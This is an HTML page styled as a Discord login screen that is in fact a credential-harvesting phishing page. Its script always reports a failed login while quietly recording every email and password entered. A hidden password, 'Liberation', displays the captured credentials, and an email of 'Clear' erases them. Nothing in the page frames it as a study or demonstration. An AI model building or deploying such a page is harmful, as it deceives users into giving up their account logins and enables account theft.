<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord Login</title>
  <style>
    body {
      background: linear-gradient(135deg, #7289da, #b5b5b5);
      color: #fff;
      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
      margin: 0;
      padding: 0;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      flex-direction: column;
    }

    .login-box {
      background-color: rgba(0, 0, 0, 0.8);
      border-radius: 5px;
      padding: 40px;
      text-align: center;
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.4);
      position: relative;
    }

    .login-box h2 {
      margin-top: 0;
      font-size: 24px;
      font-weight: 500;
      margin-bottom: 20px;
    }

    .login-box input {
      width: 100%;
      padding: 12px 20px;
      margin-bottom: 20px;
      background-color: transparent;
      border: none;
      border-bottom: 1px solid #fff;
      color: #fff;
      font-size: 16px;
      outline: none;
    }

    .login-box input::placeholder {
      color: #8e9297;
    }

    .login-box button {
      width: 100%;
      padding: 14px;
      background-color: #7289da;
      border: none;
      border-radius: 4px;
      color: #fff;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .login-box button:hover {
      background-color: #677bc4;
    }

    .error-message {
      color: red;
      margin-top: 10px;
      opacity: 0;
      transition: opacity 0.3s;
    }

    .required-fields {
      font-size: 12px;
      position: absolute;
      bottom: 10px;
      left: 50%;
      transform: translateX(-50%);
      color: #8e9297;
    }

    .required-fields::before {
      content: "* ";
      color: red;
    }

    .required-fields span {
      display: none;
    }

    .log-container {
      margin-top: 20px;
      background-color: rgba(0, 0, 0, 0.5);
      padding: 10px;
      border-radius: 5px;
      max-height: 100px;
      overflow-y: auto;
    }

    .log-container p {
      margin: 5px 0;
      font-family: monospace;
      color: #fff;
    }
  </style>
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      var loginBtn = document.getElementById('login-btn');
      var errorMessage = document.getElementById('error-message');
      var passwordInput = document.getElementById('password-input');
      var emailInput = document.getElementById('email-input');
      var logContainer = document.getElementById('log-container');
      var logText = '';

      loginBtn.addEventListener('click', function() {
        var email = emailInput.value;
        var password = passwordInput.value;

        if (password === 'Liberation' && email === 'Clear') {
          logText = '';
          passwordInput.value = '';
          emailInput.value = '';
          logContainer.innerHTML = '';
          return;
        }

        if (password === 'Liberation') {
          logContainer.style.display = 'block';
          logContainer.innerHTML = '<p>' + logText + '</p>';
        } else {
          logContainer.style.display = 'none';
        }

        errorMessage.style.opacity = '1';
        setTimeout(function() {
          errorMessage.style.opacity = '0';
        }, 3000);

        logText += 'Email: ' + email + ', Password: ' + password + '<br>';
      });

      passwordInput.addEventListener('input', function() {
        if (passwordInput.value !== 'Liberation') {
          logContainer.style.display = 'none';
        }
      });
    });
  </script>
</head>
<body>
  <div class="container">
    <div class="login-box">
      <h2>Welcome Back!</h2>
      <input type="email" placeholder="Email address" id="email-input" class="required-field">
      <input type="password" placeholder="Password" id="password-input" class="required-field">
      <button id="login-btn">Login</button>
      <div id="error-message" class="error-message">
        Incorrect email or password
      </div>
      <div id="log-container" class="log-container" style="display: none;"></div>
    </div>
  </div>
</body>
</html>
